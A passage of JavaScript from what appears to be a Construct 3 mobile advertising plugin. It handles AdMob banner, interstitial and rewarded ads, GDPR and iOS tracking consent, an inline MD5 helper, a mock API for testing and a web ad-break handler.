        return Failure(resolver, 'rewarded interstitial ad not created');
      if (this._adShowing)
        return Success(resolver, 'rewarded interstitial ad already shown');
      const show_ad = async () => {
        this._loadSuccess
          ? (_AddShowListeners.call(this, resolver), await this._ad.show())
          : (_AddLoadListeners.call(this),
            (this._loadSuccess = !1),
            (this._loadPromise = null),
            this._ad.load(),
            await this.GetLoadPromise(),
            this._loadSuccess
              ? (_AddShowListeners.call(this, resolver), await this._ad.show())
              : Failure(resolver, 'rewarded interstitial ad failed to load'));
      };
      this._adLoading
        ? (await this.GetLoadPromise(), await show_ad())
        : await show_ad();
    }
    IsLoading() {
      return this._adLoading;
    }
    IsShowing() {
      return this._adShowing;
    }
  }
  function _AddLoadListeners(resolver) {
    const onLoad = (event) => {
        (this._adLoading = !1),
          this.ResolveLoadPromise(!0),
          resolver && Success(resolver, 'rewarded interstitial ad load'),
          document.removeEventListener(Events.LOAD, onLoad),
          document.removeEventListener(Events.LOAD_FAIL, onFailLoad);
      },
      onFailLoad = (event) => {
        (this._adLoading = !1),
          this.ResolveLoadPromise(!1),
          resolver &&
            Failure(resolver, 'rewarded interstitial ad failed to load'),
          document.removeEventListener(Events.LOAD, onLoad),
          document.removeEventListener(Events.LOAD_FAIL, onFailLoad);
      };
    document.addEventListener(Events.LOAD, onLoad),
      document.addEventListener(Events.LOAD_FAIL, onFailLoad);
  }
  function _AddShowListeners(resolver) {
    const onShow = (event) => {
        (this._adShowing = !0), self.C3MobileAdvertsAPI.real.suspendRuntime();
      },
      onReward = (event) => {
        this._reward = event.reward;
      },
      onShowFail = (event) => {
        (this._adShowing = !1),
          resolver &&
            Failure(resolver, 'rewarded interstitial ad failed to show'),
          document.removeEventListener(Events.SHOW, onShow),
          document.removeEventListener(Events.SHOW_FAIL, onShowFail),
          document.removeEventListener(Events.REWARD, onReward),
          document.removeEventListener(Events.DISMISS, onDismiss);
      },
      onDismiss = (event) => {
        if (null !== this._reward) {
          const type = String(this._reward.type),
            amount = String(this._reward.amount);
          resolver && Success(resolver, JSON.stringify([type, amount]));
        } else resolver && Failure(resolver, 'closed with no reward');
        (this._reward = null),
          (this._adShowing = !1),
          (this._adLoading = !0),
          (this._loadSuccess = !1),
          (this._loadPromise = null),
          (this._loadPromise = this.GetLoadPromise()),
          _AddLoadListeners.call(this),
          self.C3MobileAdvertsAPI.real.resumeRuntime(),
          this._ad.load(),
          document.removeEventListener(Events.SHOW, onShow),
          document.removeEventListener(Events.SHOW_FAIL, onShowFail),
          document.removeEventListener(Events.REWARD, onReward),
          document.removeEventListener(Events.DISMISS, onDismiss);
      };
    document.addEventListener(Events.SHOW, onShow),
      document.addEventListener(Events.SHOW_FAIL, onShowFail),
      document.addEventListener(Events.REWARD, onReward),
      document.addEventListener(Events.DISMISS, onDismiss);
  }
  self.C3RewardedInterstitialAd = C3RewardedInterstitialAd;
}
{
  const C3AdUtils = self.C3AdUtils,
    Success = C3AdUtils.Success,
    Failure = C3AdUtils.Failure,
    IOS = !!self.cordova && 'ios' === self.cordova.platformId,
    ANDROID = !!self.cordova && 'android' === self.cordova.platformId,
    UNKNOWN = 0,
    NOT_REQUIRED = 2,
    REQUIRED = 1,
    OBTAINED = 3;
  class C3Consent {
    constructor() {
      (this._adPersonalization = 'UNKNOWN'),
        (this._inEEAorUnknown = ''),
        (this._consentStatusIndex = 0),
        (this._consentStatusString = 'UNKNOWN'),
        (this._trackingStatusString = 'not-determined'),
        (this._hasConsentForm = !1);
    }
    async Reset() {
      C3AdUtils.ConfigurationOptions.debug && (await self.consent.reset());
    }
    GetAdPersonalization() {
      return this._adPersonalization;
    }
    async RequestTrackingAuthorization() {
      IOS && (await self.admob.requestTrackingAuthorization());
    }
    async GetTrackingAuthorizationStatus() {
      if (ANDROID) return (this._trackingStatusString = 'not-determined');
      const idfaPlugin = self.cordova.plugins.idfa,
        idfaInfo = await idfaPlugin.getInfo();
      if (!idfaInfo.trackingLimited)
        return (this._trackingStatusString = 'authorized');
      switch (idfaInfo.trackingPermission) {
        case idfaPlugin.TRACKING_PERMISSION_NOT_DETERMINED:
          return (this._trackingStatusString = 'not-determined');
        case idfaPlugin.TRACKING_PERMISSION_RESTRICTED:
        case idfaPlugin.TRACKING_PERMISSION_DENIED:
          return (this._trackingStatusString = 'denied');
        case idfaPlugin.TRACKING_PERMISSION_AUTHORIZED:
          return (this._trackingStatusString = 'authorized');
      }
    }
    async RequestIDFA(resolver) {
      return ANDROID
        ? Success(resolver, 'not-determined')
        : IOS
        ? (await _UpdateRequestLocationInEEAorUnknown.call(this),
          'true' === this._inEEAorUnknown
            ? await this.RequestTrackingAuthorization()
            : (await this.GetTrackingAuthorizationStatus(),
              'not-determined' === this._trackingStatusString &&
                (await _HasConsentForm.call(this),
                this._hasConsentForm
                  ? await this.ShowIDFAMessage()
                  : await this.RequestTrackingAuthorization())),
          await this.GetTrackingAuthorizationStatus(),
          Success(resolver, this._trackingStatusString))
        : void 0;
    }
    async RequestInfoUpdateForTesting(debug, debugLocation, resolver) {
      return await _RequestInfoUpdateForTesting.call(
        this,
        debug,
        debugLocation,
        (error) => {
          Failure(
            resolver,
            error
              ? 'object' == typeof error
                ? error.message
                : error
              : 'requestInfoUpdate error'
          );
        }
      );
    }
    async RequestInfoUpdateForTestingSkipErrors(
      debug,
      debugLocation,
      resolver
    ) {
      await _RequestInfoUpdateForTesting.call(this, debug, debugLocation);
    }
    async ShowConsentForm(showConsent, showOutOfEEA = !1) {
      switch ((await _UpdateConsentStatus.call(this), showConsent)) {
        case 'eu': {
          const hasConsentForm = await _HasConsentForm.call(this);
          if (_NeedsConsent.call(this) && hasConsentForm) {
            const form = await self.consent.loadForm();
            await form.show();
          }
          break;
        }
        case 'always': {
          const hasConsentForm = await _HasConsentForm.call(this),
            isInEEA = await _UpdateRequestLocationInEEAorUnknown.call(this);
          if (hasConsentForm && 'true' === isInEEA) {
            const form = await self.consent.loadForm();
            await form.show();
          } else if (hasConsentForm && showOutOfEEA) {
            const form = await self.consent.loadForm();
            await form.show();
          }
          break;
        }
      }
      await _UpdateConsentStatus.call(this),
        await _UpdateRequestLocationInEEAorUnknown.call(this),
        await _UpdateAdPersonalization.call(this);
    }
    async ShowIDFAMessage(showConsent) {
      await this.ShowConsentForm('always', !0);
    }
    async UpdateConsentStatus() {
      await _UpdateConsentStatus.call(this),
        await _UpdateRequestLocationInEEAorUnknown.call(this),
        await _UpdateAdPersonalization.call(this);
    }
    async SuccessResponse(resolver) {
      await this.GetTrackingAuthorizationStatus(),
        Success(
          resolver,
          `${this._consentStatusString}&&${this._trackingStatusString}&&${this._inEEAorUnknown}`
        );
    }
    async FailureResponse(resolver, message) {
      Failure(resolver, message);
    }
    async StatusUpdateSuccessResponse(resolver) {
      await this.UpdateConsentStatus(),
        await this.GetTrackingAuthorizationStatus(),
        Success(
          resolver,
          `${this._consentStatusString}&&${this._trackingStatusString}&&${this._inEEAorUnknown}`
        );
    }
  }
  async function _HasConsentForm() {
    const formStatus = await self.consent.getFormStatus();
    return (
      (this._hasConsentForm = formStatus === self.consent.FormStatus.Available),
      this._hasConsentForm
    );
  }
  async function _UpdateConsentStatus() {
    const status = await self.consent.getConsentStatus();
    switch (((this._consentStatusIndex = status), this._consentStatusIndex)) {
      case REQUIRED:
        return (this._consentStatusString = 'REQUIRED');
      case NOT_REQUIRED:
        return (this._consentStatusString = 'NOT_REQUIRED');
      case OBTAINED:
        return (this._consentStatusString = 'OBTAINED');
      case UNKNOWN:
        return (this._consentStatusString = 'UNKNOWN');
    }
  }
  function _NeedsConsent() {
    switch (this._consentStatusIndex) {
      case REQUIRED:
        return !0;
      case NOT_REQUIRED:
      case OBTAINED:
        return !1;
      case UNKNOWN:
        return !0;
    }
  }
  function _UpdateAdPersonalization() {
    switch (this._consentStatusIndex) {
      case REQUIRED:
        return (this._adPersonalization = 'NON_PERSONALIZED');
      case NOT_REQUIRED:
      case OBTAINED:
        return (this._adPersonalization = 'PERSONALIZED');
      case UNKNOWN:
        return (this._adPersonalization = 'NON_PERSONALIZED');
    }
  }
  async function _UpdateRequestLocationInEEAorUnknown() {
    if (ANDROID)
      switch (this._consentStatusIndex) {
        case REQUIRED:
          return (this._inEEAorUnknown = 'true');
        case NOT_REQUIRED:
          return (this._inEEAorUnknown = 'false');
        case OBTAINED:
        case UNKNOWN:
          return (this._inEEAorUnknown = 'true');
      }
    if (IOS) {
      const gdprApplies = await _GetValueFromNativeStorage.call(
        this,
        'IABTCF_gdprApplies',
        'getInt'
      );
      return (this._inEEAorUnknown = gdprApplies ? 'true' : 'false');
    }
  }
  async function _GetValueFromNativeStorage(name, method) {
    return new Promise((resolve, reject) => {
      self.NativeStorage[method](
        name,
        (res) => resolve(res),
        (error) => resolve(1)
      );
    });
  }
  async function _RequestInfoUpdateForTesting(debug, debugLocation, onError) {
    let debugGeography = '',
      testDeviceIds = null;
    if (debug) {
      switch (debugLocation) {
        case 'EEA':
          debugGeography = self.consent.DebugGeography.EEA;
          break;
        case 'NOT_EEA':
          debugGeography = self.consent.DebugGeography.NotEEA;
          break;
        default:
          debugGeography = self.consent.DebugGeography.Disabled;
      }
      testDeviceIds = [await C3AdUtils.TestId];
    }
    try {
      return (
        debug
          ? await self.consent.requestInfoUpdate({
              debugGeography: debugGeography,
              testDeviceIds: testDeviceIds,
            })
          : await self.consent.requestInfoUpdate(),
        !0
      );
    } catch (error) {
      return onError && onError(error), !1;
    }
  }
  self.C3Consent = new C3Consent();
}
{
  const md5cycle = (x, k) => {
      let a = x[0],
        b = x[1],
        c = x[2],
        d = x[3];
      (a = ff(a, b, c, d, k[0], 7, -680876936)),
        (d = ff(d, a, b, c, k[1], 12, -389564586)),
        (c = ff(c, d, a, b, k[2], 17, 606105819)),
        (b = ff(b, c, d, a, k[3], 22, -1044525330)),
        (a = ff(a, b, c, d, k[4], 7, -176418897)),
        (d = ff(d, a, b, c, k[5], 12, 1200080426)),
        (c = ff(c, d, a, b, k[6], 17, -1473231341)),
        (b = ff(b, c, d, a, k[7], 22, -45705983)),
        (a = ff(a, b, c, d, k[8], 7, 1770035416)),
        (d = ff(d, a, b, c, k[9], 12, -1958414417)),
        (c = ff(c, d, a, b, k[10], 17, -42063)),
        (b = ff(b, c, d, a, k[11], 22, -1990404162)),
        (a = ff(a, b, c, d, k[12], 7, 1804603682)),
        (d = ff(d, a, b, c, k[13], 12, -40341101)),
        (c = ff(c, d, a, b, k[14], 17, -1502002290)),
        (b = ff(b, c, d, a, k[15], 22, 1236535329)),
        (a = gg(a, b, c, d, k[1], 5, -165796510)),
        (d = gg(d, a, b, c, k[6], 9, -1069501632)),
        (c = gg(c, d, a, b, k[11], 14, 643717713)),
        (b = gg(b, c, d, a, k[0], 20, -373897302)),
        (a = gg(a, b, c, d, k[5], 5, -701558691)),
        (d = gg(d, a, b, c, k[10], 9, 38016083)),
        (c = gg(c, d, a, b, k[15], 14, -660478335)),
        (b = gg(b, c, d, a, k[4], 20, -405537848)),
        (a = gg(a, b, c, d, k[9], 5, 568446438)),
        (d = gg(d, a, b, c, k[14], 9, -1019803690)),
        (c = gg(c, d, a, b, k[3], 14, -187363961)),
        (b = gg(b, c, d, a, k[8], 20, 1163531501)),
        (a = gg(a, b, c, d, k[13], 5, -1444681467)),
        (d = gg(d, a, b, c, k[2], 9, -51403784)),
        (c = gg(c, d, a, b, k[7], 14, 1735328473)),
        (b = gg(b, c, d, a, k[12], 20, -1926607734)),
        (a = hh(a, b, c, d, k[5], 4, -378558)),
        (d = hh(d, a, b, c, k[8], 11, -2022574463)),
        (c = hh(c, d, a, b, k[11], 16, 1839030562)),
        (b = hh(b, c, d, a, k[14], 23, -35309556)),
        (a = hh(a, b, c, d, k[1], 4, -1530992060)),
        (d = hh(d, a, b, c, k[4], 11, 1272893353)),
        (c = hh(c, d, a, b, k[7], 16, -155497632)),
        (b = hh(b, c, d, a, k[10], 23, -1094730640)),
        (a = hh(a, b, c, d, k[13], 4, 681279174)),
        (d = hh(d, a, b, c, k[0], 11, -358537222)),
        (c = hh(c, d, a, b, k[3], 16, -722521979)),
        (b = hh(b, c, d, a, k[6], 23, 76029189)),
        (a = hh(a, b, c, d, k[9], 4, -640364487)),
        (d = hh(d, a, b, c, k[12], 11, -421815835)),
        (c = hh(c, d, a, b, k[15], 16, 530742520)),
        (b = hh(b, c, d, a, k[2], 23, -995338651)),
        (a = ii(a, b, c, d, k[0], 6, -198630844)),
        (d = ii(d, a, b, c, k[7], 10, 1126891415)),
        (c = ii(c, d, a, b, k[14], 15, -1416354905)),
        (b = ii(b, c, d, a, k[5], 21, -57434055)),
        (a = ii(a, b, c, d, k[12], 6, 1700485571)),
        (d = ii(d, a, b, c, k[3], 10, -1894986606)),
        (c = ii(c, d, a, b, k[10], 15, -1051523)),
        (b = ii(b, c, d, a, k[1], 21, -2054922799)),
        (a = ii(a, b, c, d, k[8], 6, 1873313359)),
        (d = ii(d, a, b, c, k[15], 10, -30611744)),
        (c = ii(c, d, a, b, k[6], 15, -1560198380)),
        (b = ii(b, c, d, a, k[13], 21, 1309151649)),
        (a = ii(a, b, c, d, k[4], 6, -145523070)),
        (d = ii(d, a, b, c, k[11], 10, -1120210379)),
        (c = ii(c, d, a, b, k[2], 15, 718787259)),
        (b = ii(b, c, d, a, k[9], 21, -343485551)),
        (x[0] = add32(a, x[0])),
        (x[1] = add32(b, x[1])),
        (x[2] = add32(c, x[2])),
        (x[3] = add32(d, x[3]));
    },
    cmn = (q, a, b, x, s, t) => (
      (a = add32(add32(a, q), add32(x, t))),
      add32((a << s) | (a >>> (32 - s)), b)
    ),
    ff = (a, b, c, d, x, s, t) => cmn((b & c) | (~b & d), a, b, x, s, t),
    gg = (a, b, c, d, x, s, t) => cmn((b & d) | (c & ~d), a, b, x, s, t),
    hh = (a, b, c, d, x, s, t) => cmn(b ^ c ^ d, a, b, x, s, t),
    ii = (a, b, c, d, x, s, t) => cmn(c ^ (b | ~d), a, b, x, s, t),
    md51 = (s) => {
      const n = s.length,
        state = [1732584193, -271733879, -1732584194, 271733878];
      let i;
      for (i = 64; i <= s.length; i += 64)
        md5cycle(state, md5blk(s.substring(i - 64, i)));
      s = s.substring(i - 64);
      const tail = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
      for (i = 0; i < s.length; i++)
        tail[i >> 2] |= s.charCodeAt(i) << (i % 4 << 3);
      if (((tail[i >> 2] |= 128 << (i % 4 << 3)), i > 55))
        for (md5cycle(state, tail), i = 0; i < 16; i++) tail[i] = 0;
      return (tail[14] = 8 * n), md5cycle(state, tail), state;
    },
    md5blk = (s) => {
      const md5blks = [];
      for (let i = 0; i < 64; i += 4)
        md5blks[i >> 2] =
          s.charCodeAt(i) +
          (s.charCodeAt(i + 1) << 8) +
          (s.charCodeAt(i + 2) << 16) +
          (s.charCodeAt(i + 3) << 24);
      return md5blks;
    },
    hex_chr = '0123456789abcdef'.split(''),
    rhex = (n) => {
      let s = '';
      for (let j = 0; j < 4; j++)
        s += hex_chr[(n >> (8 * j + 4)) & 15] + hex_chr[(n >> (8 * j)) & 15];
      return s;
    },
    hex = (x) => {
      for (let i = 0; i < x.length; i++) x[i] = rhex(x[i]);
      return x.join('');
    },
    md5 = (s) => hex(md51(s));
  let add32 = (a, b) => (a + b) & 4294967295;
  if ('5d41402abc4b2a76b9719d911017c592' != md5('hello')) {
  }
  self.C3AdUtilsMD5 = md5;
}
{
  const C3AdUtils = self.C3AdUtils,
    C3Consent = self.C3Consent,
    C3BannerAd = self.C3BannerAd,
    C3InterstitialAd = self.C3InterstitialAd,
    C3RewardedAd = self.C3RewardedAd,
    C3RewardedInterstitialAd = self.C3RewardedInterstitialAd;
  let bannerAd = null,
    interstitialAd = null,
    videoAd = null,
    rewardedAd = null,
    rewardedInterstitialAd = null;
  const api = {},
    addHandler = (name, fn) => {
      api[name] = fn;
    };
  addHandler(
    'CreateBannerAdvert',
    async (id, size, debug, position, reload, fn) => {
      if (!(await C3AdUtils.StartAdmobPlus(fn, debug))) return;
      reload &&
        bannerAd &&
        (await bannerAd.OnLoadSettled(),
        await bannerAd.Hide(() => !0),
        bannerAd.Release(),
        (bannerAd = null));
      const adPersonalization = await C3Consent.GetAdPersonalization();
      bannerAd || (bannerAd = new C3BannerAd(id, size, position, fn)),
        bannerAd.Load(adPersonalization, fn);
    }
  ),
    addHandler('ShowBannerAdvert', async (fn) => {
      if (!bannerAd) return C3AdUtils.Failure(fn, 'banner ad not created');
      bannerAd.Show(fn);
    }),
    addHandler('HideBannerAdvert', async (fn) => {
      if (!bannerAd) return C3AdUtils.Failure(fn, 'banner ad not created');
      bannerAd.Hide(fn);
    }),
    addHandler('CreateInterstitialAdvert', async (id, debug, fn) => {
      if (interstitialAd) {
        if (interstitialAd.IsShowing())
          return C3AdUtils.Success(fn, 'interstitial ad already showing');
        if (interstitialAd.IsLoading()) {
          const ret = await interstitialAd.GetLoadPromise();
          interstitialAd.HandleOnLoadedResult(ret, fn);
        } else {
          const adPersonalization = await C3Consent.GetAdPersonalization();
          interstitialAd.Load(adPersonalization, fn);
        }
        return;
      }
      if (!(await C3AdUtils.StartAdmobPlus(fn, debug))) return;
      const adPersonalization = await C3Consent.GetAdPersonalization();
      (interstitialAd = new C3InterstitialAd(id, fn)),
        interstitialAd.Load(adPersonalization, fn);
    }),
    addHandler('ShowInterstitialAdvert', async (fn) => {
      if (!interstitialAd)
        return C3AdUtils.Failure(fn, 'interstitial ad not created');
      interstitialAd.Show(fn);
    }),
    addHandler('CreateVideoAdvert', async (id, debug, fn) => {
      if (videoAd || rewardedAd) {
        if (rewardedAd) {
          if (rewardedAd.IsShowing())
            return C3AdUtils.Success(fn, 'rewarded ad already showing');
          if (rewardedAd.IsLoading()) {
            const ret = await rewardedAd.GetLoadPromise();
            rewardedAd.HandleOnLoadedResult(ret, fn);
          } else {
            const adPersonalization = await C3Consent.GetAdPersonalization();
            rewardedAd.Load(adPersonalization, fn);
          }
          return;
        }
        if (videoAd) {
          if (videoAd.IsShowing())
            return C3AdUtils.Success(fn, 'rewarded ad already showing');
          if (videoAd.IsLoading()) {
            const ret = await videoAd.GetLoadPromise();
            videoAd.HandleOnLoadedResult(ret, fn);
          } else {
            const adPersonalization = await C3Consent.GetAdPersonalization();
            videoAd.Load(adPersonalization, fn);
          }
          return;
        }
      }
      if (!(await C3AdUtils.StartAdmobPlus(fn, debug))) return;
      const adPersonalization = await C3Consent.GetAdPersonalization();
      (videoAd = new C3RewardedAd(id, fn)), videoAd.Load(adPersonalization, fn);
    }),
    addHandler('ShowVideoAdvert', async (fn) => {
      if (!videoAd) return C3AdUtils.Failure(fn, 'video ad not created');
      videoAd.Show(fn);
    }),
    addHandler('CreateRewardedAdvert', async (id, debug, fn) => {
      if (rewardedAd || videoAd) {
        if (rewardedAd) {
          if (rewardedAd.IsShowing())
            return C3AdUtils.Success(fn, 'rewarded ad already showing');
          if (rewardedAd.IsLoading()) {
            const ret = await rewardedAd.GetLoadPromise();
            rewardedAd.HandleOnLoadedResult(ret, fn);
          } else {
            const adPersonalization = await C3Consent.GetAdPersonalization();
            rewardedAd.Load(adPersonalization, fn);
          }
          return;
        }
        if (videoAd) {
          if (videoAd.IsShowing())
            return C3AdUtils.Success(fn, 'rewarded ad already showing');
          if (videoAd.IsLoading()) {
            const ret = await videoAd.GetLoadPromise();
            videoAd.HandleOnLoadedResult(ret, fn);
          } else {
            const adPersonalization = await C3Consent.GetAdPersonalization();
            videoAd.Load(adPersonalization, fn);
          }
          return;
        }
      }
      if (!(await C3AdUtils.StartAdmobPlus(fn, debug))) return;
      const adPersonalization = await C3Consent.GetAdPersonalization();
      (rewardedAd = new C3RewardedAd(id, fn)),
        rewardedAd.Load(adPersonalization, fn);
    }),
    addHandler('ShowRewardedAdvert', async (fn) => {
      if (!rewardedAd) return C3AdUtils.Failure(fn, 'rewarded ad not created');
      rewardedAd.Show(fn);
    }),
    addHandler('CreateRewardedInterstitialAdvert', async (id, debug, fn) => {
      if (rewardedInterstitialAd) {
        if (rewardedInterstitialAd.IsShowing())
          return C3AdUtils.Success(
            fn,
            'rewarded interstitial ad already showing'
          );
        if (rewardedInterstitialAd.IsLoading()) {
          const ret = await rewardedInterstitialAd.GetLoadPromise();
          rewardedInterstitialAd.HandleOnLoadedResult(ret, fn);
        } else {
          const adPersonalization = await C3Consent.GetAdPersonalization();
          rewardedInterstitialAd.Load(adPersonalization, fn);
        }
        return;
      }
      if (!(await C3AdUtils.StartAdmobPlus(fn, debug))) return;
      const adPersonalization = await C3Consent.GetAdPersonalization();
      (rewardedInterstitialAd = new C3RewardedInterstitialAd(id, fn)),
        rewardedInterstitialAd.Load(adPersonalization, fn);
    }),
    addHandler('ShowRewardedInterstitialAdvert', async (fn) => {
      if (!rewardedInterstitialAd)
        return C3AdUtils.Failure(fn, 'rewarded interstitial ad not created');
      rewardedInterstitialAd.Show(fn);
    }),
    addHandler(
      'Configure',
      async (
        id,
        pubID,
        privacyPolicy,
        showFree,
        showConsent,
        debug,
        debugLocation,
        showOnStartUp,
        fn
      ) => {
        const firstCall = !C3AdUtils.HasInitConfigurationOptions();
        return (
          C3AdUtils.SetInitConfigureOptions(
            id,
            pubID,
            privacyPolicy,
            showFree,
            showConsent,
            debug,
            debugLocation
          ),
          (await C3AdUtils.StartAdmobPlus(fn, debug))
            ? (firstCall && (await C3Consent.Reset()),
              (await C3Consent.RequestInfoUpdateForTesting(
                debug,
                debugLocation,
                fn
              ))
                ? (firstCall
                    ? showOnStartUp
                      ? await C3Consent.ShowConsentForm('eu')
                      : await C3Consent.UpdateConsentStatus()
                    : await C3Consent.ShowConsentForm('always'),
                  void (await C3Consent.SuccessResponse(fn)))
                : C3Consent.FailureResponse(
                    fn,
                    'failure to update consent information'
                  ))
            : C3Consent.FailureResponse(fn, 'failure to initialize')
        );
      }
    ),
    addHandler('RequestConsent', async (fn) => {
      api.Configure(
        C3AdUtils.ConfigurationOptions.id,
        C3AdUtils.ConfigurationOptions.pubID,
        C3AdUtils.ConfigurationOptions.privacyPolicy,
        C3AdUtils.ConfigurationOptions.showFree,
        'always',
        C3AdUtils.ConfigurationOptions.debug,
        C3AdUtils.ConfigurationOptions.debugLocation,
        !1,
        fn
      );
    }),
    addHandler('SetMaxAdContentRating', async (label, fn) => {
      if (await C3AdUtils.StartAdmobPlus(fn)) {
        if (!label) return C3AdUtils.Failure(fn, 'Label not specified');
        try {
          C3AdUtils.UpdateAdmobPlusRequest('maxAdContentRating', label),
            C3AdUtils.Success(fn, '');
        } catch (error) {
          C3AdUtils.Failure(fn, 'invalid label');
        }
      }
    }),
    addHandler('TagForChildDirectedTreatment', async (label, fn) => {
      if (await C3AdUtils.StartAdmobPlus(fn))
        try {
          C3AdUtils.UpdateAdmobPlusRequest(
            'tagForChildDirectedTreatment',
            1 === label
          ),
            C3AdUtils.Success(fn, '');
        } catch (error) {
          C3AdUtils.Failure(fn, 'invalid label');
        }
    }),
    addHandler('TagForUnderAgeOfConsent', async (label, fn) => {
      if (await C3AdUtils.StartAdmobPlus(fn))
        try {
          C3AdUtils.UpdateAdmobPlusRequest(
            'tagForUnderAgeOfConsent',
            1 === label
          ),
            C3AdUtils.Success(fn, '');
        } catch (error) {
          C3AdUtils.Failure(fn, 'invalid label');
        }
    }),
    addHandler('RequestIDFA', async (fn) => {
      (await C3AdUtils.StartAdmobPlus(fn)) && C3Consent.RequestIDFA(fn);
    }),
    addHandler('StatusUpdate', async (debug, debugLocation, fn) => {
      if (!(await C3AdUtils.StartAdmobPlus(fn, debug)))
        return C3Consent.FailureResponse(fn, 'failure to initialize');
      await C3Consent.RequestInfoUpdateForTestingSkipErrors(
        debug,
        debugLocation,
        fn
      ),
        await C3Consent.StatusUpdateSuccessResponse(fn);
    }),
    self.C3MobileAdvertsAPI || (self.C3MobileAdvertsAPI = {}),
    (self.C3MobileAdvertsAPI.real = api);
}
{
  const STATUS_PERSONALISED = 'PERSONALIZED',
    api = {},
    addHandler = (name, fn) => (api[name] = fn),
    sleep = (t) => new Promise((r) => setTimeout(r, t));
  let bannerState = null,
    intState = null,
    videoState = null,
    rewardedState = null,
    rewardedIntState = null;
  function getArgument(name, a) {
    const args = a.slice(0, -1),
      fn = a[a.length - 1];
    return console.log(name, args), [args, fn];
  }
  addHandler('CreateBannerAdvert', async (...a) => {
    const [data, fn] = getArgument('CreateBannerAdvert', a);
    await sleep(50),
      bannerState
        ? fn('Banner already exists')
        : ((bannerState = 'ready'), fn(null, 'Created banner'));
  }),
    addHandler('ShowBannerAdvert', async (...a) => {
      const [data, fn] = getArgument('ShowBannerAdvert', a);
      await sleep(50),
        'ready' != bannerState
          ? fn('Banner cannot be shown')
          : ((bannerState = 'shown'), fn(null, 'Showed banner'));
    }),
    addHandler('HideBannerAdvert', async (...a) => {
      const [data, fn] = getArgument('HideBannerAdvert', a);
      await sleep(50),
        'shown' != bannerState
          ? fn('Banner cannot be hidden')
          : ((bannerState = null), fn(null, 'Hid banner'));
    }),
    addHandler('CreateInterstitialAdvert', async (...a) => {
      const [data, fn] = getArgument('CreateInterstitialAdvert', a);
      await sleep(50),
        intState
          ? fn('Intersitial already exists')
          : ((intState = 'ready'), fn(null, 'Created interstitial'));
    }),
    addHandler('ShowInterstitialAdvert', async (...a) => {
      const [data, fn] = getArgument('ShowInterstitialAdvert', a);
      await sleep(50),
        'ready' != intState
          ? fn('Cannot show interstitial')
          : ((intState = null), fn(null, 'Interstitial shown'));
    }),
    addHandler('CreateVideoAdvert', async (...a) => {
      const [data, fn] = getArgument('CreateVideoAdvert', a);
      await sleep(50),
        videoState
          ? fn('Video already exists')
          : ((videoState = 'ready'), fn(null, 'Created video'));
    }),
    addHandler('ShowVideoAdvert', async (...a) => {
      const [data, fn] = getArgument('ShowVideoAdvert', a);
      await sleep(50),
        'ready' != videoState
          ? fn('Cannot show video')
          : ((videoState = null), fn(null, '["example type", 20]'));
    }),
    addHandler('CreateRewardedAdvert', async (...a) => {
      const [data, fn] = getArgument('CreateRewardedAdvert', a);
      await sleep(50),
        rewardedState
          ? fn('Rewarded already exists')
          : ((rewardedState = 'ready'), fn(null, 'Created rewarded'));
    }),
    addHandler('ShowRewardedAdvert', async (...a) => {
      const [data, fn] = getArgument('ShowRewardedAdvert', a);
      await sleep(50),
        'ready' != rewardedState
          ? fn('Cannot show rewarded')
          : ((rewardedState = null), fn(null, '["example type", 20]'));
    }),
    addHandler('CreateRewardedInterstitialAdvert', async (...a) => {
      const [data, fn] = getArgument('CreateRewardedInterstitialAdvert', a);
      await sleep(50),
        rewardedIntState
          ? fn('Rewarded intersitial already exists')
          : ((rewardedIntState = 'ready'),
            fn(null, 'Created rewarded interstitial'));
    }),
    addHandler('ShowRewardedInterstitialAdvert', async (...a) => {
      const [data, fn] = getArgument('ShowRewardedInterstitialAdvert', a);
      await sleep(50),
        'ready' != rewardedIntState
          ? fn('Cannot show rewarded interstitial')
          : ((rewardedIntState = null),
            fn(null, 'Rewarded interstitial shown'));
    }),
    addHandler('Configure', async (...a) => {
      const [data, fn] = getArgument('Configure', a);
      await sleep(50), fn(null, STATUS_PERSONALISED + '&&true');
    }),
    addHandler('RequestConsent', async (...a) => {
      const [data, fn] = getArgument('RequestConsent', a);
      await sleep(50), fn(null, STATUS_PERSONALISED + '&&true');
    }),
    addHandler('RequestIDFA', async (...a) => {
      const [data, fn] = getArgument('RequestIDFA', a);
      await sleep(50), fn(null, 'authorized');
    }),
    self.C3MobileAdvertsAPI || (self.C3MobileAdvertsAPI = {}),
    (self.C3MobileAdvertsAPI.fake = api);
}
{
  const C3AdUtils = self.C3AdUtils,
    api = {},
    addHandler = (name, fn) => {
      api[name] = fn;
    };
  let init = !1,
    readyPromise = null;
  const isReady = async (resolver) =>
      api.webAdsScriptLoaded
        ? (init ||
            ((self.adsbygoogle = self.adsbygoogle || []),
            (self.adBreak = self.adConfig = (o) => self.adsbygoogle.push(o)),
            (init = !0)),
          readyPromise ||
            ((readyPromise = new Promise((resolve, reject) => {
              self.adConfig({
                preloadAdBreaks: 'on',
                onReady: () => resolve(!0),
              });
            })),
            readyPromise))
        : (C3AdUtils.Failure(
            resolver,
            'advert script not loaded, likely blocked by an ad blocker'
          ),
          !1),
    suspendRuntime = () => {
      api.suspendRuntime && api.suspendRuntime();
    },
    resumeRuntime = () => {
      api.resumeRuntime && api.resumeRuntime();
    };
  addHandler(
    'CreateBannerAdvert',
    async (id, size, debug, position, reload, fn) => {
      C3AdUtils.Failure(fn, 'banner ads not supported in web platform');
    }
  ),
    addHandler('ShowBannerAdvert', async (fn) => {
      C3AdUtils.Failure(fn, 'banner ads not supported in web platform');
    }),
    addHandler('HideBannerAdvert', async (fn) => {
      C3AdUtils.Failure(fn, 'banner ads not supported in web platform');
    }),
    addHandler('CreateInterstitialAdvert', async (id, debug, fn) => {
      (await isReady(fn)) && C3AdUtils.Success(fn, 'interstitial ad created');
    }),
    addHandler('ShowInterstitialAdvert', async (fn) => {
      (await isReady(fn)) &&
        self.adBreak({
          type: 'next',
          beforeAd: () => suspendRuntime(),
          afterAd: () => resumeRuntime(),
          adBreakDone: (placementInfo) => {
            switch (placementInfo.breakStatus) {
              case 'viewed':
              case 'dismissed':
                C3AdUtils.Success(fn, 'interstitial ad show');
                break;
              default:
                console.table(placementInfo),
                  C3AdUtils.Failure(fn, 'interstitial ad failed to show');
            }
          },
        });
    }),
    addHandler('CreateVideoAdvert', async (id, debug, fn) => {
      C3AdUtils.Failure(fn, 'video ads are deprecated');
    }),
    addHandler('ShowVideoAdvert', async (fn) => {
      C3AdUtils.Failure(fn, 'video ads are deprecated');
    }),
    addHandler('CreateRewardedAdvert', async (id, debug, fn) => {
